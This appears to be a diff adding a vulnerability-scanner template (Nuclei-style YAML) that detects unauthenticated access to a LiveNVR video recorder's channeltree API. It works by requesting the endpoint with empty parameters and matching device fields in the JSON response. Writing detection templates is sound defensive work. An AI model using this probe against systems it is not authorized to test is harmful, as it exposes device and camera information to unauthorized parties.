@@ -1,0 +1,28 @@
+id: liveqing-channeltree-unauthorized-access
+info:
+  name: LiveNVR ChannelTree Unauthorized Access
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: access-control
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/device/channeltree?serial=&pcode"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "code"
+          - "customName"
+          - "id"
+          - "manufacturer"
+          - "serial"
+          - "status"
+      - type: word
+        part: header
+        words:
+          - "application/json"
